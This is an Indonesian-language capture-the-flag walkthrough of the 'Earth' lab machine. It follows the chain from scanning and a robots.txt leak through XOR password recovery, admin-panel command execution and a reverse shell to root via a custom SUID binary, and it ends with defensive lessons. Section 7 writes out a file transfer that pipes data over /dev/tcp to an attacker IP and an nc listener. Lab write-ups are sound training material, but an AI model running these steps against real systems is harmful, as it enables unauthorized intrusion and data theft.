# Earth Walkthrough

## Objective

Tujuan challenge ini adalah memperoleh akses root pada target machine melalui kombinasi web enumeration, analisis enkripsi XOR, remote command execution, dan privilege escalation.

---

# 1. Reconnaissance

## Host Discovery

Langkah pertama adalah mencari host aktif pada jaringan.

```bash
arp-scan -l
```

Ditemukan alamat IP target yang akan digunakan pada tahap berikutnya.

---

## Service Enumeration

Selanjutnya dilakukan enumerasi service untuk mengetahui port yang terbuka, service yang berjalan, dan informasi tambahan yang tersedia.

```bash
nmap -sC -sV -A <TARGET_IP>
```

Hasil scanning menunjukkan adanya virtual host:

```text
earth.local
terratest.earth.local
```

Agar domain tersebut dapat diakses secara lokal, tambahkan ke file hosts.

```bash
sudo nano /etc/hosts
```

```text
<TARGET_IP> earth.local
<TARGET_IP> terratest.earth.local
```

---

# 2. Web Enumeration

## earth.local

Saat diakses, website menampilkan beberapa pesan yang terlihat terenkripsi.

Hal ini mengindikasikan adanya mekanisme komunikasi internal yang mungkin dapat dianalisis lebih lanjut.

---

## terratest.earth.local

Saat diakses hanya menampilkan halaman sederhana bertuliskan:

```text
Test Site
```

Meskipun terlihat tidak menarik, environment testing sering kali mengandung informasi sensitif yang tidak tersedia pada website utama.

---

## Directory Enumeration

Dilakukan pencarian direktori tersembunyi.

```bash
gobuster dir -u http://earth.local \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Ditemukan endpoint:

```text
/admin
```

Mengakses endpoint tersebut menampilkan halaman login administrator.

### Checkpoint

```text
Admin Login Page Found
```

---

## robots.txt Analysis

Pada subdomain testing ditemukan file robots.txt.

```text
http://terratest.earth.local/robots.txt
```

Isi file:

```text
Disallow: /testingnotes.*
```

Endpoint tersebut kemudian diakses dan menghasilkan catatan internal developer.

---

## Information Disclosure

Isi catatan:

```text
Using XOR encryption as the algorithm.
testdata.txt was used to test encryption.
terra used as username for admin portal.
```

Informasi penting yang berhasil diperoleh:

| Data           | Nilai        |
| -------------- | ------------ |
| Username Admin | terra        |
| Encryption     | XOR          |
| Reference File | testdata.txt |

---

# 3. Credential Recovery

Dari catatan sebelumnya diketahui bahwa:

* Sistem menggunakan XOR
* Tersedia file testdata.txt
* Username administrator adalah terra

Langkah berikutnya adalah mengumpulkan seluruh ciphertext yang tersedia pada halaman utama earth.local.

Ciphertext tersebut kemudian dibandingkan dengan data yang tersedia pada testdata.txt untuk memperoleh key XOR yang digunakan.

Setelah key berhasil diidentifikasi, ciphertext dapat didekripsi menjadi plaintext yang dapat dibaca.

Salah satu plaintext yang diperoleh ternyata merupakan password administrator.

---

## Admin Access

Login dilakukan menggunakan kredensial:

```text
Username : terra
Password : <hasil dekripsi>
```

Login berhasil dilakukan dan akses ke panel administrator diperoleh.

---

# 4. Initial Access

Setelah masuk ke panel administrator ditemukan fitur yang memungkinkan eksekusi command pada server.

Contoh command yang berhasil dijalankan:

```bash
whoami
pwd
ls
cat
```

Output menunjukkan bahwa command dieksekusi sebagai user biasa dan belum memiliki hak akses root.

---

# 5. Reverse Shell

Karena panel administrator dapat menjalankan command pada server, fitur tersebut dapat digunakan untuk memperoleh shell interaktif.

Reverse shell berhasil diperoleh dan koneksi kembali ke mesin attacker berhasil dibuat.

Setelah shell didapatkan, dilakukan upgrade TTY agar shell lebih stabil.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Status:

```text
Interactive Shell Obtained
```

---

# 6. Privilege Escalation Enumeration

Dilakukan pencarian file SUID.

```bash
find / -perm -u=s 2>/dev/null
```

Ditemukan binary menarik:

```text
/usr/bin/reset_root
```

Binary ini tidak termasuk binary standar Linux sehingga menjadi kandidat utama untuk dianalisis.

---

# 7. Binary Analysis

Selama enumerasi SUID ditemukan binary menarik:

```bash
find / -perm -u=s 2>/dev/null
```

Output:

```text
/usr/bin/reset_root
```

Karena bukan binary standar Linux, binary tersebut dianalisis lebih lanjut.

## Transfer Binary

Binary disalin dari target ke mesin attacker untuk dianalisis secara lokal.

Pada mesin attacker:

```bash
nc -lvnp 3333 > reset_root
```

Pada shell target:

```bash
cat /usr/bin/reset_root > /dev/tcp/<ATTACKER_IP>/3333
```

Setelah transfer selesai:

```bash
chmod +x reset_root
```

## Dynamic Analysis

Analisis dilakukan menggunakan `ltrace` untuk melihat library call yang dipanggil program.

```bash
ltrace ./reset_root
```

Output menunjukkan adanya pengecekan terhadap file tertentu:

```text
access("/blab/lalab", F_OK) = -1
```

## Analisis

Dari output tersebut dapat disimpulkan bahwa program memeriksa keberadaan file:

```text
/blab/lalab
```

Jika file tidak ada, program tidak melanjutkan ke proses berikutnya.

Karena path tersebut dapat dibuat oleh user yang sedang digunakan, maka dibuat file yang diminta.

Pada target:

```bash
mkdir -p /blab
touch /blab/lalab
```

## Re-run Binary

Binary dijalankan kembali:

```bash
/usr/bin/reset_root
```

Kali ini program berhasil melewati pengecekan dan menampilkan informasi sensitif berupa password root.

Temuan ini menunjukkan bahwa mekanisme validasi pada binary hanya bergantung pada keberadaan file tertentu yang dapat dibuat oleh user biasa.


# 8. Exploiting reset_root

Setelah file yang diperlukan dibuat pada target, binary dijalankan kembali.

Program kemudian mengungkap informasi sensitif yang dapat digunakan untuk memperoleh akses administratif.

Dari output tersebut diperoleh password root.

---

# 9. Root Access

Menggunakan password yang diperoleh:

```bash
su root
```

Verifikasi:

```bash
whoami
```

Output:

```text
root
```

Privilege escalation berhasil dilakukan.

---

# 10. Capture The Flag

Flag terakhir ditemukan pada:

```text
/ root / root_flag.txt
```

(ditulis tanpa spasi pada sistem sebenarnya)

Membaca file tersebut menghasilkan root flag.

---

# Attack Path Summary

```text
ARP Scan
   │
   ▼
Nmap Enumeration
   │
   ▼
Virtual Host Discovery
   │
   ▼
Directory Enumeration
   │
   ▼
Admin Login Page Discovery
   │
   ▼
robots.txt Disclosure
   │
   ▼
Developer Notes Disclosure
   │
   ▼
XOR Analysis
   │
   ▼
Password Recovery
   │
   ▼
Admin Access
   │
   ▼
Command Execution
   │
   ▼
Reverse Shell
   │
   ▼
SUID Enumeration
   │
   ▼
reset_root Analysis
   │
   ▼
Root Password Disclosure
   │
   ▼
Root Access
   │
   ▼
Root Flag
```

# Lessons Learned

1. Informasi sensitif tidak boleh disimpan pada environment testing.
2. XOR bukan pengganti algoritma kriptografi modern untuk penyimpanan kredensial.
3. robots.txt tidak boleh dianggap sebagai mekanisme keamanan.
4. Fitur eksekusi command pada panel admin dapat berujung pada Remote Code Execution.
5. Binary SUID kustom harus diaudit secara menyeluruh karena berpotensi menyebabkan privilege escalation.
